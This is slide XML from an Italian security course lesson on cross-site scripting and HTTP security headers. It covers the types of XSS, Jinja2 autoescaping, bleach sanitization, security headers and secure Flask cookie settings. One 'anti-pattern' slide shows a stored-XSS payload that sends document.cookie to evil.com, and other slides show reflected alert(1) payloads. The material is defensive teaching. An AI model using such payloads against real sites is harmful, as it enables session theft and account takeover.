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365760" cy="2286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A0B0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>LEZIONE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XSS e header HTTP di sicurezza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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>JavaScript dell'attaccante nel browser della vittima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A0B0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>⏱  Lezione 5 · 2 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Corso IFTS STEM · Specialista nelle Tecniche di Evoluzione e Manutenzione del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Ing. Alessandro Manneschi · Anno formativo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Obiettivi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Cos'è Cross-Site Scripting (XSS) e i suoi 3 tipi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Eseguire XSS Reflected e XSS Stored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Difendersi con escape automatico (Jinja2 e amici)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Conoscere i 6 header HTTP di sicurezza fondamentali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Configurare cookie sicuri (Secure, HttpOnly, SameSite)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0" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="00A0B0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828800"/>
            <a:ext cx="91440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1">
                <a:solidFill>
                  <a:srgbClr val="0F2D52"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>XSS = il JavaScript dell'attaccante eseguito nel browser della tua vittima.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Come funziona un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1. Scarica HTML della pagina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2. Applica CSS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3. Trova tag &lt;script&gt; e li ESEGUE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4. Permette al JS di accedere a DOM, cookie, fare richieste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Se l'attaccante riesce a far eseguire del SUO JS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dentro la TUA pagina → ha accesso a tutto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(cookie sessione, dati form, azioni a nome utente)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 3 tipi di XSS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REFLECTED — il payload è nell'URL, riflesso nella pagina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Esempio: /cerca?q=&lt;script&gt;alert(1)&lt;/script&gt;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Vittima: chi clicca il link malevolo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STORED — il payload è salvato nel DB (commenti, post)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Vittima: chiunque visita la pagina (più grave)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DOM-BASED — JS della pagina prende valore da location.hash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Più raro, più subdolo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Esempio: Stored XSS letale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9875520" y="164592"/>
            <a:ext cx="2103120" cy="4572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🚩 ANTI-PATTERN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206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Commento postato dall'attaccante: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&lt;script&gt;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fetch('https://evil.com/?c=' + document.cookie)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&lt;/script&gt;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Cosa succede quando un altro utente visita la pagina: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1. Il browser scarica il commento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2. Trova il tag &lt;script&gt;, lo esegue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3. Lo script invia il cookie di sessione della VITTIMA all'attaccante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4. L'attaccante usa quel cookie → account takeover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Senza chiedere mai la password.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E63946"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>⚠  Per questo HttpOnly sui cookie di sessione è critico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La correzione: escape automatico (Jinja2)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9875520" y="164592"/>
            <a:ext cx="2103120" cy="457200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✅ JINJA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206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&lt;!-- Template Jinja2 in Flask --&gt;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&lt;h1&gt;Risultati per: {{ query }}&lt;/h1&gt;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Se query contiene: &lt;script&gt;alert(1)&lt;/script&gt;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Jinja2 la trasforma automaticamente in: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&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;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Il browser la mostra come TESTO LETTERALE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NON la esegue come tag → XSS neutralizzata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Equivalenti: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Java + Thymeleaf:  &lt;span th:text="${query}"&gt;&lt;/span&gt;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PHP + Twig:        {{ query }}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React:             {query}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06A77D"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>✓  Default escape è SEMPRE attivo. Non disabilitarlo con |safe.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Il pericolo del |safe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In Jinja2: {{ comment | safe }}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Disabilita l'escape → XSS GARANTITA su input utente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Equivalenti in altri framework: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Vue: v-html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React: dangerouslySetInnerHTML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Blade: {!! $x !!}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Usali solo su testo statico che hai scritto TU.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Mai, MAI, MAI su input utente.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Se l'utente DEVE poter scrivere HTML ricco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Caso: piattaforma blog, commenti con grassetto/corsivo/link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Soluzione: bleach (Python) — sanitization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from bleach import clean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safe = clean(input, tags=['p','b','i','a'],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          attributes={'a':['href']},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           protocols=['http','https'])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Mantiene &lt;b&gt;&lt;i&gt;&lt;p&gt;&lt;a&gt;, rimuove &lt;script&gt;, attributi javascript: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0"/>
            <a:ext cx="1828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0" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="00A0B0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8961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200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="0F2D52"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Header HTTP di sicurezza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931920"/>
            <a:ext cx="89611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Configurazione rapida, difese potenti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 6 header di sicurezza fondamentali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Header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Cosa fa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Strict-Transport-Security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Forza HTTPS dopo prima visita (HSTS)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Content-Security-Policy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Limita risorse caricabili (anti-XSS L2)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X-Frame-Options: DENY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Blocca clickjacking via iframe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X-Content-Type-Options: nosniff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Blocca MIME sniffing del browser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Referrer-Policy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Controlla cosa va nel Referer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Permissions-Policy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Limita API browser (camera, mic, geoloc)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058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Cookie sicuri</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9875520" y="164592"/>
            <a:ext cx="2103120" cy="457200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✅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206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Configurazione Flask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app.config.update(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SESSION_COOKIE_SECURE=True,      # Solo HTTPS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SESSION_COOKIE_HTTPONLY=True,     # JS NON può leggerlo (anti-XSS)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SESSION_COOKIE_SAMESITE="Lax",    # Anti-CSRF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    PERMANENT_SESSION_LIFETIME=3600,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)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/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Risultato nel browser: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Set-Cookie: session=abc123;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            Secure;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            HttpOnly;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            SameSite=Lax;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            Path=/;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="1A1A2E"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>#             Max-Age=3600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1">
                <a:solidFill>
                  <a:srgbClr val="06A77D"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>✓  3 attributi + 1 configurazione = -90% rischio di session hijacking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Test rapido del tuo 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Vai su: securityheaders.com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Inserisci il tuo dominio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Ti dà un voto da F ad A+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Confronto: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github.com → A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Molti siti italiani PA → F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Aggiungere tutti gli header in Flask: 10 minuti con Flask-Talisman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457200"/>
            <a:ext cx="3200400" cy="320040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457200"/>
            <a:ext cx="3200400" cy="3200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0A0B0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Cosa portarti via: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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>➜  Prossima lezione: L6 — Input validation + Supply chain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4739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73952"/>
            <a:ext cx="1188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L5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